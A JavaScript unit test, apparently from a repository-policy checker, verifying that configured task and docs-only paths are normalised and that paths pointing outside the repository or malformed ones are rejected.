test("configured paths are normalised before they feed the never-docs set or the allowlist; one outside the repository is refused (re-review A)", () => {
  const r = repo();
  // The reviewer's probe: tasksDir "./docs/tickets" with the default allowlist made a ticket docs-only.
  for (const tasksDir of ["./docs/tickets", "/docs/tickets", "docs/tickets/", "docs\\tickets\\", "Docs/Tickets", ".//docs//tickets"]) {
    r.setMain({ steering: { tasksDir } });
    const out = r.check(branch(r, `t${Math.random().toString(36).slice(2)}`, () => r.write("docs/tickets/T05.md", `Status: integrated ${Math.random()}\n`)));
    assert.equal(out.status, 3, `${tasksDir}: ${out.stdout}`); assert.match(out.stdout, /installed or read by the factory/);
  }
  for (const tasksDir of ["../tickets", "docs/../../x", "C:/tickets", ".", "", "docs/*", 7]) {
    r.setMain({ steering: { tasksDir } });
    const out = r.check(branch(r, `u${Math.random().toString(36).slice(2)}`, () => r.write("docs/guide.md", `v ${Math.random()}\n`)));
    assert.equal(out.status, 4, `${JSON.stringify(tasksDir)}: ${out.stdout}`); assert.match(out.stdout, /steering\.tasksDir must name a directory/);
  }
  r.setMain({ docsOnly: { paths: ["./handbook/**", "/*.md"] } });
  assert.equal(r.check(branch(r, "hbn", () => { r.write("handbook/a.md", "x\n"); r.write("NOTES.md", "x\n"); })).status, 0, "./ and / prefixes in docsOnly.paths are normalised");
  for (const paths of [["../handbook/**"], ["handbook/../../x/**"], ["C:\\docs\\**"]]) {
    r.setMain({ docsOnly: { paths } });
    assert.equal(r.check(branch(r, `v${Math.random().toString(36).slice(2)}`, () => r.write("docs/guide.md", `v ${Math.random()}\n`))).status, 4, JSON.stringify(paths));
  }
});
